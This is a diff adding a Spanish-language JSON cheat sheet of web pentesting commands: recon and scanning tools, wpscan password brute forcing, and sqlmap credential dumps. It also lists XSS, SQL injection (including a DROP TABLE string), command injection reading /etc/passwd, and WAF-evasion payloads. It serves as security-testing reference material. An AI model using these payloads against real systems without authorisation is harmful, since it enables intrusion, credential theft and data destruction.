@@ -1,0 +1,430 @@
+{
+  "metadatos": {
+    "version": "1.0.0",
+    "autor": "DogSoulDev - Ares Aegis",
+    "descripcion": "Análisis de vulnerabilidades web y herramientas de pentesting",
+    "fecha_actualizacion": "2025-07-20"
+  },
+  "categorias": {
+    "reconocimiento_web": {
+      "titulo": "🔍 Reconocimiento Web",
+      "descripcion": "Herramientas para recopilar información sobre aplicaciones web",
+      "herramientas": {
+        "whatweb": {
+          "descripcion": "Identificar tecnologías web",
+          "comandos": [
+            {
+              "comando": "whatweb URL",
+              "descripcion": "Identificar tecnologías del sitio web",
+              "ejemplo": "whatweb https://example.com"
+            },
+            {
+              "comando": "whatweb -v URL",
+              "descripcion": "Análisis verbose con más detalles",
+              "ejemplo": "whatweb -v https://target.com"
+            },
+            {
+              "comando": "whatweb -a 3 URL",
+              "descripcion": "Análisis agresivo (nivel 3)",
+              "ejemplo": "whatweb -a 3 https://vulnerable-site.com"
+            }
+          ]
+        },
+        "wappalyzer": {
+          "descripcion": "Análisis de tecnologías web desde línea de comandos",
+          "comandos": [
+            {
+              "comando": "wappalyzer URL",
+              "descripcion": "Detectar tecnologías web",
+              "ejemplo": "wappalyzer https://example.com"
+            }
+          ]
+        },
+        "dirb": {
+          "descripcion": "Fuerza bruta de directorios web",
+          "comandos": [
+            {
+              "comando": "dirb URL",
+              "descripcion": "Buscar directorios con wordlist por defecto",
+              "ejemplo": "dirb https://example.com"
+            },
+            {
+              "comando": "dirb URL WORDLIST",
+              "descripcion": "Usar wordlist personalizada",
+              "ejemplo": "dirb https://target.com /usr/share/wordlists/dirb/common.txt"
+            },
+            {
+              "comando": "dirb URL -X .php,.html,.js",
+              "descripcion": "Buscar archivos con extensiones específicas",
+              "ejemplo": "dirb https://site.com -X .php,.asp,.aspx"
+            }
+          ]
+        },
+        "dirbuster": {
+          "descripcion": "Herramienta GUI para fuerza bruta de directorios",
+          "comandos": [
+            {
+              "comando": "dirbuster",
+              "descripcion": "Iniciar DirBuster (interfaz gráfica)",
+              "ejemplo": "dirbuster → configurar URL y wordlist"
+            }
+          ]
+        },
+        "ffuf": {
+          "descripcion": "Fuzzer web rápido y moderno",
+          "comandos": [
+            {
+              "comando": "ffuf -w WORDLIST -u URL/FUZZ",
+              "descripcion": "Fuzzear directorios",
+              "ejemplo": "ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u https://target.com/FUZZ"
+            },
+            {
+              "comando": "ffuf -w WORDLIST -u URL -H 'Host: FUZZ.target.com'",
+              "descripcion": "Fuzzear subdominios",
+              "ejemplo": "ffuf -w subdomains.txt -u https://target.com -H 'Host: FUZZ.target.com'"
+            },
+            {
+              "comando": "ffuf -w WORDLIST -u URL/FUZZ -fc 404",
+              "descripcion": "Filtrar códigos de respuesta",
+              "ejemplo": "ffuf -w wordlist.txt -u https://site.com/FUZZ -fc 404,403"
+            }
+          ]
+        }
+      }
+    },
+    "vulnerabilidades_web": {
+      "titulo": "🛡️ Escaneo de Vulnerabilidades Web",
+      "descripcion": "Herramientas para identificar vulnerabilidades en aplicaciones web",
+      "herramientas": {
+        "nikto": {
+          "descripcion": "Escáner de vulnerabilidades web",
+          "comandos": [
+            {
+              "comando": "nikto -h URL",
+              "descripcion": "Escaneo básico de vulnerabilidades",
+              "ejemplo": "nikto -h https://example.com"
+            },
+            {
+              "comando": "nikto -h URL -p PORT",
+              "descripcion": "Especificar puerto personalizado",
+              "ejemplo": "nikto -h https://target.com -p 8080"
+            },
+            {
+              "comando": "nikto -h URL -output FILE",
+              "descripcion": "Guardar resultados en archivo",
+              "ejemplo": "nikto -h https://site.com -output scan_results.txt"
+            },
+            {
+              "comando": "nikto -h URL -Tuning x",
+              "descripción": "Tipos específicos de pruebas (x=número)",
+              "ejemplo": "nikto -h https://target.com -Tuning 1,2,3,b"
+            }
+          ]
+        },
+        "wpscan": {
+          "descripcion": "Escáner especializado en WordPress",
+          "comandos": [
+            {
+              "comando": "wpscan --url URL",
+              "descripcion": "Escaneo básico de WordPress",
+              "ejemplo": "wpscan --url https://wordpress-site.com"
+            },
+            {
+              "comando": "wpscan --url URL --enumerate u",
+              "descripcion": "Enumerar usuarios",
+              "ejemplo": "wpscan --url https://wp-site.com --enumerate u"
+            },
+            {
+              "comando": "wpscan --url URL --enumerate p",
+              "descripcion": "Enumerar plugins vulnerables",
+              "ejemplo": "wpscan --url https://target.com --enumerate p"
+            },
+            {
+              "comando": "wpscan --url URL --enumerate t",
+              "descripcion": "Enumerar temas vulnerables",
+              "ejemplo": "wpscan --url https://wp-site.com --enumerate t"
+            },
+            {
+              "comando": "wpscan --url URL --passwords WORDLIST",
+              "descripcion": "Ataque de fuerza bruta a contraseñas",
+              "ejemplo": "wpscan --url https://site.com --passwords /usr/share/wordlists/rockyou.txt"
+            }
+          ]
+        },
+        "sqlmap": {
+          "descripcion": "Herramienta automática para SQL injection",
+          "comandos": [
+            {
+              "comando": "sqlmap -u URL",
+              "descripcion": "Escaneo básico de SQL injection",
+              "ejemplo": "sqlmap -u 'https://site.com/page.php?id=1'"
+            },
+            {
+              "comando": "sqlmap -u URL --dbs",
+              "descripcion": "Enumerar bases de datos",
+              "ejemplo": "sqlmap -u 'https://target.com/vulnerable.php?id=1' --dbs"
+            },
+            {
+              "comando": "sqlmap -u URL -D DATABASE --tables",
+              "descripcion": "Enumerar tablas de una base de datos",
+              "ejemplo": "sqlmap -u 'https://site.com/page.php?id=1' -D users --tables"
+            },
+            {
+              "comando": "sqlmap -u URL -D DB -T TABLE --columns",
+              "descripcion": "Enumerar columnas de una tabla",
+              "ejemplo": "sqlmap -u 'URL' -D users -T accounts --columns"
+            },
+            {
+              "comando": "sqlmap -u URL -D DB -T TABLE -C COLUMN --dump",
+              "descripcion": "Extraer datos de columnas específicas",
+              "ejemplo": "sqlmap -u 'URL' -D users -T accounts -C username,password --dump"
+            }
+          ]
+        },
+        "burpsuite": {
+          "descripcion": "Plataforma integrada para testing de aplicaciones web",
+          "comandos": [
+            {
+              "comando": "burpsuite",
+              "descripcion": "Iniciar Burp Suite (versión community)",
+              "ejemplo": "burpsuite → Configurar proxy en 127.0.0.1:8080"
+            },
+            {
+              "comando": "java -jar burpsuite_pro.jar",
+              "descripcion": "Iniciar versión profesional",
+              "ejemplo": "java -jar burpsuite_pro.jar"
+            }
+          ]
+        },
+        "zaproxy": {
+          "descripcion": "OWASP ZAP - Proxy para seguridad web",
+          "comandos": [
+            {
+              "comando": "zaproxy",
+              "descripcion": "Iniciar OWASP ZAP",
+              "ejemplo": "zaproxy → Proxy automático en 8080"
+            },
+            {
+              "comando": "zap-baseline.py -t URL",
+              "descripcion": "Escaneo básico automatizado",
+              "ejemplo": "zap-baseline.py -t https://example.com"
+            },
+            {
+              "comando": "zap-full-scan.py -t URL",
+              "descripcion": "Escaneo completo con spider y escaneo activo",
+              "ejemplo": "zap-full-scan.py -t https://target.com"
+            }
+          ]
+        }
+      }
+    },
+    "inyecciones": {
+      "titulo": "💉 Inyecciones y Explotación",
+      "descripcion": "Técnicas y herramientas para inyecciones web",
+      "herramientas": {
+        "xss": {
+          "descripcion": "Cross-Site Scripting (XSS)",
+          "comandos": [
+            {
+              "comando": "<script>alert('XSS')</script>",
+              "descripcion": "Payload básico de XSS",
+              "ejemplo": "Insertar en formularios o parámetros GET"
+            },
+            {
+              "comando": "<img src=x onerror=alert('XSS')>",
+              "descripcion": "XSS usando atributo onerror",
+              "ejemplo": "Funciona cuando script está bloqueado"
+            },
+            {
+              "comando": "javascript:alert('XSS')",
+              "descripcion": "XSS en URL",
+              "ejemplo": "En barra de direcciones o href"
+            },
+            {
+              "comando": "';alert('XSS');//",
+              "descripcion": "XSS rompiendo contexto JavaScript",
+              "ejemplo": "Cuando input está dentro de script"
+            }
+          ]
+        },
+        "sql_injection": {
+          "descripcion": "Inyección SQL manual",
+          "comandos": [
+            {
+              "comando": "' OR '1'='1",
+              "descripcion": "Bypass de autenticación básico",
+              "ejemplo": "En campos username/password"
+            },
+            {
+              "comando": "' UNION SELECT 1,2,3--",
+              "descripcion": "UNION para extraer datos",
+              "ejemplo": "Determinar número de columnas primero"
+            },
+            {
+              "comando": "' AND 1=1--",
+              "descripcion": "Confirmar inyección SQL (verdadero)",
+              "ejemplo": "Página debe cargar normalmente"
+            },
+            {
+              "comando": "' AND 1=2--",
+              "descripcion": "Confirmar inyección SQL (falso)",
+              "ejemplo": "Página debe mostrar error o no cargar"
+            },
+            {
+              "comando": "'; DROP TABLE users;--",
+              "descripcion": "¡PELIGROSO! Eliminar tabla",
+              "ejemplo": "Solo en entornos de prueba autorizados"
+            }
+          ]
+        },
+        "command_injection": {
+          "descripcion": "Inyección de comandos del sistema",
+          "comandos": [
+            {
+              "comando": "; ls -la",
+              "descripcion": "Ejecutar comando adicional",
+              "ejemplo": "En parámetros que ejecutan comandos"
+            },
+            {
+              "comando": "| whoami",
+              "descripcion": "Pipe para ejecutar comando",
+              "ejemplo": "Concatenar con comando original"
+            },
+            {
+              "comando": "&& cat /etc/passwd",
+              "descripcion": "Ejecutar si comando anterior es exitoso",
+              "ejemplo": "ping google.com && cat /etc/passwd"
+            },
+            {
+              "comando": "`id`",
+              "descripcion": "Ejecución con backticks",
+              "ejemplo": "echo `whoami` → ejecuta whoami"
+            }
+          ]
+        }
+      }
+    },
+    "herramientas_automaticas": {
+      "titulo": "🤖 Herramientas Automáticas",
+      "descripcion": "Scanners y herramientas automatizadas",
+      "herramientas": {
+        "nessus": {
+          "descripcion": "Scanner de vulnerabilidades profesional",
+          "comandos": [
+            {
+              "comando": "sudo systemctl start nessusd",
+              "descripcion": "Iniciar servicio Nessus",
+              "ejemplo": "Acceder vía web: https://localhost:8834"
+            },
+            {
+              "comando": "sudo systemctl stop nessusd",
+              "descripcion": "Detener servicio Nessus",
+              "ejemplo": "Para liberar recursos"
+            }
+          ]
+        },
+        "openvas": {
+          "descripcion": "Scanner de vulnerabilidades open source",
+          "comandos": [
+            {
+              "comando": "sudo gvm-setup",
+              "descripcion": "Configuración inicial de OpenVAS",
+              "ejemplo": "Primera vez que se instala"
+            },
+            {
+              "comando": "sudo gvm-start",
+              "descripcion": "Iniciar servicios OpenVAS",
+              "ejemplo": "Acceder vía web: https://localhost:9392"
+            },
+            {
+              "comando": "sudo gvm-stop",
+              "descripcion": "Detener servicios OpenVAS",
+              "ejemplo": "Para liberar recursos del sistema"
+            }
+          ]
+        },
+        "nuclei": {
+          "descripcion": "Scanner rápido basado en templates",
+          "comandos": [
+            {
+              "comando": "nuclei -u URL",
+              "descripcion": "Escaneo básico con todos los templates",
+              "ejemplo": "nuclei -u https://example.com"
+            },
+            {
+              "comando": "nuclei -l urls.txt",
+              "descripcion": "Escanear múltiples URLs desde archivo",
+              "ejemplo": "nuclei -l target_urls.txt"
+            },
+            {
+              "comando": "nuclei -u URL -t TEMPLATE",
+              "descripcion": "Usar template específico",
+              "ejemplo": "nuclei -u https://site.com -t xss/"
+            },
+            {
+              "comando": "nuclei -u URL -severity critical,high",
+              "descripcion": "Filtrar por severidad",
+              "ejemplo": "nuclei -u https://target.com -severity critical,high"
+            }
+          ]
+        }
+      }
+    },
+    "bypass_waf": {
+      "titulo": "🛡️ Bypass de WAF y Filtros",
+      "descripcion": "Técnicas para evadir Web Application Firewalls",
+      "herramientas": {
+        "encoding": {
+          "descripcion": "Técnicas de codificación",
+          "comandos": [
+            {
+              "comando": "%3Cscript%3Ealert('XSS')%3C/script%3E",
+              "descripcion": "URL encoding para XSS",
+              "ejemplo": "Codificar caracteres especiales"
+            },
+            {
+              "comando": "&#60;script&#62;alert('XSS')&#60;/script&#62;",
+              "descripcion": "HTML entity encoding",
+              "ejemplo": "< = &#60;, > = &#62;"
+            },
+            {
+              "comando": "0x3C736372697074",
+              "descripcion": "Hexadecimal encoding",
+              "ejemplo": "Convertir payload a hexadecimal"
+            }
+          ]
+        },
+        "case_variation": {
+          "descripcion": "Variación de mayúsculas/minúsculas",
+          "comandos": [
+            {
+              "comando": "<ScRiPt>alert('XSS')</ScRiPt>",
+              "descripcion": "Mezclar mayúsculas y minúsculas",
+              "ejemplo": "Evadir filtros case-sensitive"
+            },
+            {
+              "comando": "uNiOn SeLeCt",
+              "descripcion": "SQL con case mixing",
+              "ejemplo": "uNiOn SeLeCt 1,2,3"
+            }
+          ]
+        },
+        "comment_insertion": {
+          "descripcion": "Inserción de comentarios",
+          "comandos": [
+            {
+              "comando": "UNI/**/ON SE/**/LECT",
+              "descripcion": "Comentarios en SQL",
+              "ejemplo": "SELECT * FROM users UNI/**/ON SELECT"
+            },
+            {
+              "comando": "<scr/**/ipt>alert('XSS')</scr/**/ipt>",
+              "descripcion": "Comentarios en HTML",
+              "ejemplo": "Romper detección de palabras clave"
+            }
+          ]
+        }
+      }
+    }
+  }
+}
